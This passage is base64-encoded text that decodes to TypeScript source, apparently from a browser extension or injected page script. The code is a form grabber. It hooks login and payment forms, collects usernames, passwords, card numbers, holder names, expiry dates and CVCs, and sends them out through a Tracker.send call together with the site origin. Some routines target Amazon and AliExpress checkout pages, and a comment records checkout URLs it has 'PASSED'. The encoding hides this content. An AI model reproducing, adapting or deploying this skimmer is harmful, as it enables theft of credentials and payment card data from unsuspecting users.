ICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcblxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5jcmF3bEF1dGhGb3JtRWxlbWVudChzZWxmLCBlbGVtZW50cywgX19jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHJlc29sdmVBdXRoRXZlbnQoc2VsZjogdGhpcywgZWxlbWVudDogYW55LCBhcnJheTogYW55KSB7XHJcbiAgICAgICAgbGV0IGVsZW1lbnROb2RlOiBhbnksIGVsZW1lbnROYW1lOiBhbnksIGVsZW1lbnRUeXBlOiBhbnksIGVsZW1lbnRWYWx1ZTogYW55O1xyXG4gICAgICAgIChlbGVtZW50IGFzIEhUTUxFbGVtZW50KS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgbmV3IFNldChhcnJheSkuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgWy4uLl9fZGV0ZWN0ZWRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKF9fYXR0cmlidXRlKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9fYXR0cmlidXRlLm5vZGVWYWx1ZS5sZW5ndGggIT09IDAgJiYgX19hdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCA+PSA0KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFsndXNlcicsICdsb2dpbicsICdlbWFpbCcsICdwYXNzJ10uZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUF0dHJpYnV0ZTogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19hdHRyaWJ1dGUubm9kZVZhbHVlLnRvTG93ZXJDYXNlKCkuaW5kZXhPZihfX2VsaWdpYmxlQXR0cmlidXRlKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50Tm9kZSA9IF9fZGV0ZWN0ZWRFbGVtZW50O1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnROYW1lID0gX19lbGlnaWJsZUF0dHJpYnV0ZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50VHlwZSA9IF9fZGV0ZWN0ZWRFbGVtZW50LnR5cGU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudFZhbHVlID0gX19kZXRlY3RlZEVsZW1lbnQudmFsdWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0pO1xyXG5cclxuICAgICAgICAgICAgICAgIGlmIChlbGVtZW50VmFsdWUubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXNzd29yZFN0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBub2RlOiBlbGVtZW50Tm9kZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogZWxlbWVudE5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IGVsZW1lbnRUeXBlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogZWxlbWVudFZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG5cclxuICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlTG9naW5EYXRhJyxcclxuICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICBcImV2ZW50XCI6IHNlbGYuYXV0aEV2ZW50LFxyXG4gICAgICAgICAgICAgICAgICAgIFwidXNlcm5hbWVcIjogc2VsZi5wYXNzd29yZFN0b3JlWzBdPy52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICBcInBhc3N3b3JkXCI6IHNlbGYucGFzc3dvcmRTdG9yZVsxXT8udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICBzZWxmLnBhc3N3b3JkU3RvcmUgPSBbXTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBjcmF3bFBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBlbGVtZW50czogYW55IFtdLCBfX2Zvcm1FbGVtZW50OiBIVE1MRWxlbWVudCkge1xyXG4gICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcz8uZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICBbJ2lucHV0JywgJ2J1dHRvbicsICdzZWxlY3QnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IF9fZWxpZ2libGVFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgWydpbnB1dCcsICdzZWxlY3QnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlRGF0YUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IF9fZWxpZ2libGVEYXRhRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgWyd0ZXh0JywgJ3RlbCcsICdudW1iZXInLCAncGFzc3dvcmQnLCAncmFkaW8nLCAnc2VsZWN0LW9uZSddLmZvckVhY2goZnVuY3Rpb24gKF9fZWxpZ2libGVFbGVtZW50VHlwZSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC50eXBlID09PSBfX2VsaWdpYmxlRWxlbWVudFR5cGUpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWy4uLl9fY2hpbGRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKF9fYXR0cmlidXRlKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19hdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCAhPT0gMCAmJiBfX2F0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoID49IDMpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50RWxlbWVudHNBdHRyaWJ1dGUuZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUtleXdvcmQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoX19lbGlnaWJsZUtleXdvcmQpLmxlbmd0aCAhPT0gMCAmJiBfX2VsaWdpYmxlS2V5d29yZC5jb25zdHJ1Y3RvciA9PT0gT2JqZWN0KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3Qua2V5cyhfX2VsaWdpYmxlS2V5d29yZCkuZm9yRWFjaChmdW5jdGlvbiAoX19jYXJkRGF0YUtleSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZWxpZ2libGVLZXl3b3JkW19fY2FyZERhdGFLZXldLmZvckVhY2goZnVuY3Rpb24gKF9fcUtleTogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2F0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xICYmIF9fYXR0cmlidXRlLm5vZGVWYWx1ZS50b0xvd2VyQ2FzZSgpLmluZGV4T2YoJ25vbmUnIHx8ICdoaWRkZW4nIHx8ICdkaXNhYmxlJykgPT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5wdXNoKF9fY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICBbJ3N1Ym1pdCcsICdidXR0b24nXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2VsaWdpYmxlQ29sbGVjdG9yRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQudHlwZSA9PT0gX19lbGlnaWJsZUNvbGxlY3RvckVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucmVzb2x2ZVBheW1lbnRFdmVudChzZWxmLCBfX2NoaWxkRWxlbWVudC5mb3JtLCBfX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5jcmF3bFBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBlbGVtZW50cywgX19jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKiBQQVNTRURcclxuICAgICogaHR0cHM6Ly93d3cudHVubmVsYmVhci5jb20vYWNjb3VudC9jaGVja291dFxyXG4gICAgKiBodHRwczovL3d3dy5hbWF6b24uY29tL2NwZS95b3VycGF5bWVudHMvd2FsbGV0XHJcbiAgICAqICovXHJcblxyXG5cclxuICAgIHJlc29sdmVQYXltZW50RXZlbnQoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogYW55LCBfX2RhdGFDb2xsZWN0b3JFbGVtZW50OiBhbnksIGFycmF5OiBhbnkgW10pIHtcclxuICAgICAgICBbJ3N1Ym1pdCddLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUV2ZW50KSB7XHJcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihfX2Zvcm1FdmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgc2VsZi5jb2xsZWN0UGF5bWVudERhdGEoc2VsZiwgYXJyYXkpO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9KTtcclxuICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJywgJ29udG91Y2hzdGFydCddLmZvckVhY2goZnVuY3Rpb24gKF9fZGF0YUNvbGxlY3RvckV2ZW50KSB7XHJcbiAgICAgICAgICAgIF9fZGF0YUNvbGxlY3RvckVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihfX2RhdGFDb2xsZWN0b3JFdmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgc2VsZi5jb2xsZWN0UGF5bWVudERhdGEoc2VsZiwgYXJyYXkpO1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9KTtcclxuXHJcblxyXG4gICAgICAgIHRyeSB7XHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cuc2VsZiAhPT0gd2luZG93LnRvcCkge1xyXG4gICAgICAgICAgICAgICAgbmV3IFNldChhcnJheSkuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgIFsna2V5dXAnLCAna2V5ZG93bicsICdjaGFuZ2UnLCAncGFzdGUnXS5mb3JFYWNoKGZ1bmN0aW9uIChfX2V2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWRFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoX19ldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5jb2xsZWN0UGF5bWVudERhdGEoc2VsZiwgYXJyYXkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9IGNhdGNoIChlKSB7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGNvbGxlY3RQYXltZW50RGF0YShzZWxmOiB0aGlzLCBhcnJheTogYW55IFtdKSB7XHJcbiAgICAgICAgbGV0IGVsZW1lbnROb2RlOiBhbnksIGVsZW1lbnROYW1lOiBhbnksIGVsZW1lbnRUeXBlOiBhbnksIGVsZW1lbnRWYWx1ZTogYW55O1xyXG4gICAgICAgIG5ldyBTZXQoYXJyYXkpLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgWy4uLl9fZGV0ZWN0ZWRFbGVtZW50LmF0dHJpYnV0ZXNdLmZvckVhY2goZnVuY3Rpb24gKF9fYXR0cmlidXRlKSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX19hdHRyaWJ1dGUubm9kZVZhbHVlLmxlbmd0aCAhPT0gMCAmJiBfX2F0dHJpYnV0ZS5ub2RlVmFsdWUubGVuZ3RoID49IDMpIHtcclxuICAgICAgICAgICAgICAgICAgICBwYXltZW50RWxlbWVudHNBdHRyaWJ1dGUuZm9yRWFjaChmdW5jdGlvbiAoX19lbGlnaWJsZUtleXdvcmQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoX19lbGlnaWJsZUtleXdvcmQpLmxlbmd0aCAhPT0gMCAmJiBfX2VsaWdpYmxlS2V5d29yZC5jb25zdHJ1Y3RvciA9PT0gT2JqZWN0KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3Qua2V5cyhfX2VsaWdpYmxlS2V5d29yZCkuZm9yRWFjaChmdW5jdGlvbiAoX19jYXJkRGF0YUtleSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZWxpZ2libGVLZXl3b3JkW19fY2FyZERhdGFLZXldLmZvckVhY2goZnVuY3Rpb24gKF9fcUtleTogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2F0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcUtleSkgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50Tm9kZSA9IF9fZGV0ZWN0ZWRFbGVtZW50O1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudE5hbWUgPSBfX2NhcmREYXRhS2V5O1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudFR5cGUgPSBfX2RldGVjdGVkRWxlbWVudC50eXBlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudFZhbHVlID0gX19kZXRlY3RlZEVsZW1lbnQudmFsdWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICBpZiAoZWxlbWVudFZhbHVlLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgc2VsZi5jcmVkaXRDYXJkU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgbm9kZTogZWxlbWVudE5vZGUsXHJcbiAgICAgICAgICAgICAgICAgICAgbmFtZTogZWxlbWVudE5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgdHlwZTogZWxlbWVudFR5cGUsXHJcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGVsZW1lbnRWYWx1ZVxyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgICAgICBzZWxmLnJldHJpZXZlQWNjdXJhdGVEYXRhKHNlbGYsIHNlbGYuY3JlZGl0Q2FyZFN0b3JlKTtcclxuICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogc2VsZi5jcmVkaXRDYXJkUnVudGltZU51bWJlciAhPT0gJycgPyBzZWxmLmNyZWRpdENhcmRSdW50aW1lTnVtYmVyIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVCcmFuZCAhPT0gJycgPyBzZWxmLmNyZWRpdENhcmRSdW50aW1lQnJhbmQgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVIb2xkZXJOYW1lICE9PSAnJyA/IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVIb2xkZXJOYW1lIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgXCJjYXJkRXhwaXJlXCI6IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVFeHBpcmVEYXRlICE9PSAnJyA/IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVFeHBpcmVEYXRlLyouc3Vic3RyaW5nKDAsIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVFeHBpcmVEYXRlLmxlbmd0aCAtIDEpKi8gOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVDdmMgIT09ICcnID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUN2YyA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgICAgICBzZWxmLmNyZWRpdENhcmRTdG9yZSA9IFtdO1xyXG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVIb2xkZXJOYW1lID0gJyc7XHJcbiAgICAgICAgc2VsZi5jcmVkaXRDYXJkUnVudGltZU51bWJlciA9ICcnO1xyXG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVCcmFuZCA9ICcnO1xyXG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVFeHBpcmVEYXRlID0gJyc7XHJcbiAgICAgICAgc2VsZi5jcmVkaXRDYXJkUnVudGltZUN2YyA9ICcnO1xyXG4gICAgICAgIHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVQb3N0YWxDb2RlID0gJyc7XHJcbiAgICAgICAgLy9zZWxmLnZlcmlmeUZvcm1FbGVtZW50KHNlbGYpO1xyXG4gICAgfVxyXG5cclxuICAgIHJldHJpZXZlQWNjdXJhdGVEYXRhKHNlbGY6IHRoaXMsIF9fY3JlZGl0Q2FyZERhdGFTdG9yZTogYW55IFtdKSB7XHJcbiAgICAgICAgaWYgKF9fY3JlZGl0Q2FyZERhdGFTdG9yZS5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgX19jcmVkaXRDYXJkRGF0YVN0b3JlLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWREYXRhRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgKF9fZGV0ZWN0ZWREYXRhRWxlbWVudC5uYW1lID09PSAnY2FyZE51bWJlcicpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZU51bWJlciA9IF9fZGV0ZWN0ZWREYXRhRWxlbWVudC52YWx1ZSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgKF9fZGV0ZWN0ZWREYXRhRWxlbWVudC5uYW1lID09PSAnY2FyZEhvbGRlcicpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUhvbGRlck5hbWUgKz0gX19kZXRlY3RlZERhdGFFbGVtZW50LnZhbHVlICsgJyAnIDogJyc7XHJcbiAgICAgICAgICAgICAgICAoX19kZXRlY3RlZERhdGFFbGVtZW50Lm5hbWUgPT09ICdjYXJkQnJhbmQnKSA/IHNlbGYuY3JlZGl0Q2FyZFJ1bnRpbWVCcmFuZCA9IF9fZGV0ZWN0ZWREYXRhRWxlbWVudC52YWx1ZSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgKF9fZGV0ZWN0ZWREYXRhRWxlbWVudC5uYW1lID09PSAnY2FyZEV4cGlyZScpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGUgKz0gX19kZXRlY3RlZERhdGFFbGVtZW50LnZhbHVlICsgJy8nIDogJyc7XHJcbiAgICAgICAgICAgICAgICAoX19kZXRlY3RlZERhdGFFbGVtZW50Lm5hbWUgPT09ICdjYXJkQ1ZDJykgPyBzZWxmLmNyZWRpdENhcmRSdW50aW1lQ3ZjID0gX19kZXRlY3RlZERhdGFFbGVtZW50LnZhbHVlIDogJyc7XHJcbiAgICAgICAgICAgICAgICAoX19kZXRlY3RlZERhdGFFbGVtZW50Lm5hbWUgPT09ICdjYXJkUG9zdGFsQ29kZScpID8gc2VsZi5jcmVkaXRDYXJkUnVudGltZVBvc3RhbENvZGUgPSBfX2RldGVjdGVkRGF0YUVsZW1lbnQudmFsdWUgOiAnJztcclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGJhY2t1cFNjcmlwdHMoc2VsZjogdGhpcykge1xyXG4gICAgICAgIGxldCBpbnRlcnZhbDEgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2FtYXpvbicpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbWF6b25QYXltZW50Q29udGFpbmVyKHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2FsaWV4cHJlc3MnKSAhPT0gLTEpIHtcclxuXHJcbiAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290JykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290Jyk/LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAxKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGludGVydmFsNCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKT8udGV4dENvbnRlbnQ/LmluZGV4T2YoJ0FkZCBhIG5ldyBjYXJkJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wcm9jZXNzQWxpRXhwcmVzc1BheW1lbnROZXdDYXJkT25TZWNvbmRQYXltZW50KHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJpbmQtYnV0dG9uLXdyYXAgJyk/LmZpcnN0RWxlbWVudENoaWxkPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmRPblNlY29uZFBheW1lbnQoc2VsZik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTcGVjaWZpY0VsZW1lbnRCeVRhZ05hbWUoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaGVjay1vdXQtcm9vdCcpIGFzIEhUTUxFbGVtZW50KSwgJ3NwYW4nLCAncGF5bWVudC10aXRsZScsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogSFRNTEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYmluZC1idXR0b24td3JhcCcpPy5maXJzdEVsZW1lbnRDaGlsZD8u